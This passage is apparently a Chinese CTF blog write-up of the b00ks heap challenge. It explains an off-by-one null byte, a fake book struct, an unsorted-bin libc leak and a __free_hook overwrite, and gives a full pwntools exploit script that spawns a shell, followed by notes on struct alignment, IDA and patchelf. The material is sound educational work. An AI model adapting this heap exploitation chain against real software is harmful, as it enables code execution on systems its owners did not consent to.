+</span></span></code></pre></div><p>而 book list 的起始位置非常敏感，双击跟进去发现它的位置是 <code>unk_202060</code>，而 author 的位置是 <code>unk_202040</code>，而我们 read_author 函数正好可以读入一个 0x20 的字符串，而 book list 的起始位置（即 book1 的地址）和这个 author name 之间并没有空字符，通过功能 4 print the book detail 可以直接泄漏 book1，一个堆指针。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/16gx $rebase<span style="color:#f92672">(</span>0x202020+32<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0x5a7b29802040: 0x6161616161616161                        0x6161616161616161
+</span></span><span style="display:flex;"><span>0x5a7b29802050: 0x6161616161616161                        0x6261616161616161 &lt;<span style="color:#f92672">===</span> author name
+</span></span><span style="display:flex;"><span>0x5a7b29802060: 0x00005a7b29f7b130 &lt;<span style="color:#f92672">===</span> the book1 addr    0x0000000000000000
+</span></span><span style="display:flex;"><span>              
+</span></span></code></pre></div><p>另一个很重要的点是，<code>create</code> 时 book 的 <code>name_size</code> 和 <code>description_size</code> 都是完全可控的，并且，chunk 的申请顺序是先 <code>malloc name</code>，再 <code>malloc description</code>，最后 <code>malloc book struct</code>。</p>
+<p>由于我们只能将 author 的后一位置为 <code>0</code>，也就是将 book1_addr 的低 byte 置为 <code>0</code>，而 edit book 功能又只能修改 description，只有通过构造恰当的 book name size，才能利用 description 指针构造 fake book1 做到任意地址读写。注意：book1 的 description 会被用来构造 fake book1，因此其大小必须为 0x20，因此只能调整 book name size。</p>
+<p>调试发现，当 name size 为 0x80 时，<code>book1-&gt;description</code> 恰好为一个最低一字节全为 0 的地址，而这个地址所指向的内容是可以由 edit 功能任意修改的，故可以将其布置为一个 fake book1，其 name/descriton 全部由攻击者掌控。此时我们再调用一次 <code>read_author</code>， 即可覆盖 book1 最低字节为 0，而被覆盖后的地址恰好是原来 book 的 description，从而成功伪造一个完全可控的 fake book。</p>
+<p>到这里，我们就成功拿到了任意地址读写，接下来只要泄漏 libc base，打一个 free hook 就可以了。</p>
+<p>如何泄漏 libc base 呢？一个想法是申请一个非常大的 chunk，这个 chunk 由于过大，会撞到内存映射区，因此无法用 <code>(s)brk</code> 而只能用 <code>mmap</code> 申请。而 <code>mmap</code> 申请 arena 的内存与的 libc 的偏移是固定的，通过调试可以得出这个偏移值，只要读这个超级大 chunk 的地址，就可以拿到 libc base。</p>
+<p>这个想法不太可行，很多师傅的 wp 都反映会出现本地通远程不通的情况，甚至我这里本地都不通（（</p>
+<p>另一个想法是利用 unsort bin attack 泄漏 <code>fd</code> 指针，这个想法也比较简单，先 create 一个 name 和 description 都大于 80 bytes 的 book，然后 free 掉，这个 chunk 会被扔进 unsort bin 里，其 fd_addr 与 book1_addr 的偏移是固定的为 0x30，然后利用 <code>fd</code> 与 arena 存在固定偏移以及 arena 在 libc 全局符号表内，得出 libc base。</p>
+<p>泄漏出 libc base 之后的 free hook 是没有难点的。</p>
+<h3 id="攻击流程">攻击流程</h3>
+<p>申请 3 个 book，book2 free 掉用来打 unsort bin attack，book1 伪造 fake book1，fake book1 的 name 布置为 book2-&gt;fd，其 description 指向 book3 的 description，前者 edit 为 <code>__free_hook</code>，后者 edit 为 <code>system</code>，然后 delete book3 即可执行 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<h3 id="exp">exp</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;b00ks&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(proc)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = remote(&#34;node5.buuoj.cn&#34;, 29264)</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">option</span>(index: int):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_book</span>(name_size: int, book_name: bytes, des_size: int, des: bytes):
+</span></span><span style="display:flex;"><span>    option(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enter book name size: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(name_size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter book name (Max 32 chars): &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(book_name)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enter book description size: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(des_size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter book description: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(des)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_book</span>(index: int):
+</span></span><span style="display:flex;"><span>    option(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter the book id you want to delete: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_book</span>(index: int, des: bytes):
+</span></span><span style="display:flex;"><span>    option(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter the book id you want to edit: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter new book description: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(des)
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_book</span>(index: int) <span style="color:#f92672">-&gt;</span> tuple:
+</span></span><span style="display:flex;"><span>    option(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(index):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ID: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        idx: int <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Name: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        name: bytes <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Description: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        description: bytes <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Author: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        author: bytes <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> idx, name, description, author
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_name</span>(author: bytes):
+</span></span><span style="display:flex;"><span>    option(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter author name: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(author)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter author name: &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>create_book(<span style="color:#ae81ff">0xd0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbb&#34;</span>)
+</span></span><span style="display:flex;"><span>create_book(<span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ccc&#34;</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ddd&#34;</span>)
+</span></span><span style="display:flex;"><span>create_book(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span><span style="display:flex;"><span>delete_book(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx, name, description, author <span style="color:#f92672">=</span> print_book(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>book1_addr <span style="color:#f92672">=</span> u64(author[<span style="color:#ae81ff">32</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;book1_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(book1_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit_book(<span style="color:#ae81ff">1</span>, flat([<span style="color:#ae81ff">1</span>, book1_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>, book1_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x130</span>, <span style="color:#ae81ff">0xffff</span>]))
+</span></span><span style="display:flex;"><span>change_name(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx, name, description, author <span style="color:#f92672">=</span> print_book(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>fd_addr <span style="color:#f92672">=</span> u64(name<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> fd_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">88</span> <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>]
+</span></span><span style="display:flex;"><span>free_hook_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;fd_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(fd_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">libc_base ===&gt; </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">free_hook_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(free_hook_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;system_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit_book(<span style="color:#ae81ff">1</span>, p64(free_hook_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># 不太理解的地方</span>
+</span></span><span style="display:flex;"><span>edit_book(<span style="color:#ae81ff">3</span>, p64(system_addr))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># input()</span>
+</span></span><span style="display:flex;"><span>delete_book(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="反思">反思</h2>
+<p>讲几个做这道题时遇到的知识点。</p>
+<h3 id="q_1-c-语言中如何计算-struct-结构的内存大小">$Q_{1}$: C 语言中如何计算 struct 结构的内存大小？</h3>
+<p>$A_{1}$: 一开始是看 wiki 的时候，不太理解那个 book struct 的内存大小为啥是 0x20 bytes，越想越不对劲，去搜了一下发现还是字节对齐的锅。</p>
+<p>字节对齐是为了提高内存访问的效率与速度，它的细节和编译器实现有关，但一般而言，遵循以下规则：</p>
+<ol>
+<li>结构体变量的首地址是结构体中最宽基本类型成员的大小的倍数；</li>
+<li>结构体每个成员相对于结构体首地址的偏移量都是该成员内存大小的整数倍，也就是说相邻的两个不同类型的成员之间可能需要填充字节，填充至相邻两成员的最小公倍数；</li>
+<li>结构体所占的总内存大小应为结构体中最宽基本类型成员的倍数，也就是可能在最后一个成员之后填充字节。</li>
+</ol>
+<p>注意：结构体不算作基本类型成员。</p>
+<p>按照这个规则，可以得出以下结构体所占的内存为 24 字节：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> node {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> a; <span style="color:#75715e">// 1 字节，但会填充至 4 字节
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> b; <span style="color:#75715e">// 4 字节，至此共 8 字节，与 long long 相同，不需要填充
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> c; <span style="color:#75715e">// 8 字节，至此共 16 字节
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> d; <span style="color:#75715e">// 1 字节，至此共 17 字节
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 结构体总大小必须为 8 的整数倍，所以填充至 24 字节
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><h3 id="q_2-逆向中如何用-ida-分析复杂结构体">$Q_{2}$: 逆向中如何用 IDA 分析复杂结构体？</h3>
+<p>$A_2$：算是一个可以加速逆向分析的小 trick，毕竟一堆指针偏移看起来还是挺烦躁的。</p>
+<ul>
+<li>首先打开 IDA，使用快捷键 Shift+F1 打开本地类型窗口。</li>
+<li>按下 insert 快捷键，弹出类型声明窗口，在该窗口的编辑区域以 C 语言语法定义结构体。</li>
+<li>输入定义的结构体。</li>
+<li>双击我们想要导入的结构体，选择导入结构体。</li>
+<li>点击 OK 后 IDA 会自动解析我们定义的结构体。</li>
+</ul>
+<p>具体细节参考<a href="https://bbs.kanxue.com/thread-266419.htm#msg_header_h1_2">这篇文章</a>和<a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html">这篇文章</a>。</p>
+<p>关于 ida 中 db, dw, dd, dq 分别是什么含义，可以看<a href="https://www.tortall.net/projects/yasm/manual/html/nasm-pseudop.html">这个</a></p>
+<h3 id="q_3-如何正确使用-patchelf">$Q_3$: 如何正确使用 patchelf?</h3>
+<p>$A_3$：先叠个甲，真不是我不读 readme，我前前后后把 patchelf repo readme 读了三四遍，这 b 文档连个示例都没有，我也不知道该用绝对路径还是相对路径，相对路径的话该不该加 ./ 这种东西，绝对路径的话是从家目录开始还是从根目录开始，太抽象了。。。</p>
+<p>然后顶着 csdn 的恶臭味找了篇<a href="https://blog.csdn.net/llovewuzhengzi/article/details/134234465">教程</a>，你别说。</p>
+<h2 id="总结">总结</h2>
+<p>这道题目综合考察的知识点还是比较多的，涉及到 off by one 在堆中的利用，绕过 &ldquo;\x00&rdquo; 截断，利用 mmap 泄漏 libc，unsort bin attack 和 free hook，还有一些其他乱七八糟的东西。记录这道题目的目的也是为了完全搞懂这些知识点，全部弄清楚。</p>
+<p>寒假开始正式接触堆了，数据结构会更复杂，奇奇怪怪的本地通远程不通等等玄学问题，调也调不明白，就顶着压力嗯调。</p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+            <div class="post-tags">
+              <a href="/tags/pwn/">
+                pwn
+              </a>
+            </div>
+            
+            <div class="post-tags">
+              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/">
+                堆溢出
+              </a>
+            </div>
+            
+            <div class="post-tags">
+              <a href="/tags/offbyone/">
+                offbyone
+              </a>
+            </div>
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        
+
+<link rel="shortcut icon" href="favicon.ico" />
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+            delimiters: [
+                {left: "$$", right: "$$", display: true},
+                {left: "$", right: "$", display: false}
+            ]
+        });
+    });
+</script>
+
+
+
+
+<link rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+  document.querySelectorAll('pre code').forEach((el) => {
+    hljs.highlightElement(el);
+  });
+});
+</script>
+
+
+
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
